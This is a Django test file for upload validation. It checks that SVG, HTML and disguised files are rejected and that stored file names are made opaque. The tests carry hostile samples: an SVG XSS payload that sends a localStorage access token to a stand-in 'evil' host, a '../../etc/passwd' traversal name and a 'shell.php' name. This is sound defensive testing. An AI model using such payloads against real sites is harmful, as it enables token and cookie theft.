"""Upload gatekeeping: what a user is allowed to store on our own origin."""

import io

from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import TestCase
from rest_framework import serializers

from apps.core.uploads import (
    opaque_name,
    validate_document_upload,
    validate_image_upload,
)


def png_bytes(size=(8, 8)):
    from PIL import Image

    buf = io.BytesIO()
    Image.new("RGB", size, (200, 30, 30)).save(buf, format="PNG")
    return buf.getvalue()


SVG_XSS = (
    b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">'
    b"<script>fetch('//evil/'+localStorage.ym_access)</script></svg>"
)


class ImageUploadValidationTests(TestCase):
    def test_accepts_a_real_png(self):
        f = SimpleUploadedFile("photo.png", png_bytes(), content_type="image/png")
        self.assertIs(validate_image_upload(f), f)

    def test_rejects_svg_even_with_an_image_content_type(self):
        """The whole point: an SVG served from our origin runs script."""
        f = SimpleUploadedFile("x.svg", SVG_XSS, content_type="image/svg+xml")
        with self.assertRaises(serializers.ValidationError):
            validate_image_upload(f)

    def test_rejects_html(self):
        f = SimpleUploadedFile("x.html", b"<script>alert(1)</script>", content_type="text/html")
        with self.assertRaises(serializers.ValidationError):
            validate_image_upload(f)

    def test_rejects_a_script_renamed_to_png(self):
        """An allowed extension is not evidence of an allowed file."""
        f = SimpleUploadedFile("evil.png", SVG_XSS, content_type="image/png")
        with self.assertRaises(serializers.ValidationError):
            validate_image_upload(f)

    def test_rejects_an_oversized_file(self):
        f = SimpleUploadedFile("big.png", png_bytes(), content_type="image/png")
        with self.assertRaises(serializers.ValidationError):
            validate_image_upload(f, max_bytes=10)


class DocumentUploadValidationTests(TestCase):
    def test_accepts_a_pdf(self):
        f = SimpleUploadedFile("licence.pdf", b"%PDF-1.4 ...", content_type="application/pdf")
        self.assertIs(validate_document_upload(f), f)

    def test_rejects_a_fake_pdf(self):
        f = SimpleUploadedFile("x.pdf", b"not really a pdf", content_type="application/pdf")
        with self.assertRaises(serializers.ValidationError):
            validate_document_upload(f)

    def test_rejects_svg(self):
        f = SimpleUploadedFile("x.svg", SVG_XSS, content_type="image/svg+xml")
        with self.assertRaises(serializers.ValidationError):
            validate_document_upload(f)


class OpaqueNameTests(TestCase):
    def test_keeps_extension_and_drops_the_client_name(self):
        name = opaque_name("../../etc/passwd.png")
        self.assertTrue(name.endswith(".png"))
        self.assertNotIn("/", name)
        self.assertNotIn("passwd", name)

    def test_drops_an_extension_we_do_not_allow(self):
        self.assertFalse(opaque_name("shell.php").endswith(".php"))

    def test_names_are_unique(self):
        self.assertNotEqual(opaque_name("a.png"), opaque_name("a.png"))
